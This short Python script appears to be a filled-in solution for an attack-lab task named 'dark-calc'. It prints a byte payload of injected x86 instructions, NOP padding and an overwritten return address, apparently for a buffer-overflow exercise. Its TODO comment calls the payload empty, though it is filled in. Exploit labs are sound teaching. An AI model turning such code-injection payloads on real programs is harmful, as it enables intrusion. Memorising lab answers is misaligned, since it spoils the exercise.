#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b"\xbf\x04\x00\x00\x00\xb8\x87\x1a\x40\x00\xff\xd0\x90\x90\x90\x90        \xd0\x0f\x80\x00\x10\x72\x00\x00"

sys.stdout.buffer.write(payload)
